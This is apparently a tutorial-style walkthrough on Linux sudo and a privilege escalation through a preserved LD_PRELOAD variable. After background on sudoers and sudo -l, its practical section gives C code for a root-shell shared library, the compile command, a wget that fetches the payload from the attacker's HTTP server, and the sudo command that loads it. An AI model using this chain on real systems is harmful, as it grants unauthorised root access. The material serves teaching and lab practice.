# Background on Sudo

Sudo allows users to temporarily elevate their privileges to those of the `root` user. Sudo was introduced as a safer way to escalate privileges by mitigating the risks associated with unrestricted access to the entire machine.

Modifying the sudoers file at `/etc/sudoers` allows you to assign specific or all commands that a user has permission to run as sudo. To edit the sudoers file, use the 'visudo' text editor to parse the file for syntax errors and prevent complications with the Sudo command.

```
sudo visudo
```

For a user to edit the sudoers file, they must be in the sudo group.

```
sudo usermod -aG sudo [username]
```

You can check the commands your user has permission to run as sudo with:

```
sudo -l
```

Running this command on my machine outputs the following:

```
Matching Defaults entries for kayem on kali:
    env_reset, env_keep+=LD_PRELOAD

User kayem may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

`env_reset` is an option that defaults environment variables before running the command with sudo; unless the environment variable is added to the list of preserved variables with the `env_keep` option. In the example above, the `LD_PRELOAD` environment variable is retained when resetting the environment.

To restrict `LD_PRELOAD` from loading in arbitrary shared libraries, dynamic linkers ignore the environment variable if the Real UserID (RUID) differs from the effective UserID (UID). The Real UserID represents the user who executed the sudo command; the effective user ID is the user ID under which the process runs. For instance, when running processes with sudo, the RUID will be 1000 whilst the uid will be 0 (root), so the environment variable will be ignored. 

# Practical

Using the `sudo -l` command, I discover that the user `kayem` has access to three programs: find, less, and nano. We can abuse the `LD_PRELOAD` environment variable by uploading the following C program to spawn a root shell.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
Compile the C program into an object file for execution.
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Host a python3 HTTP server to transfer the object file from our machine to the target machine.
```
sudo python3 -m http.server 8000
```
Download the file on our target machine.
```
wget http://[IP address]:8000/shell.so
```

Finally, modify the LD_PRELOAD variable to point to our malicious program and run the program we have permission to run with sudo, in this case, `find`.

```
sudo LD_PRELOAD=/home/kayem/shell.so find
```
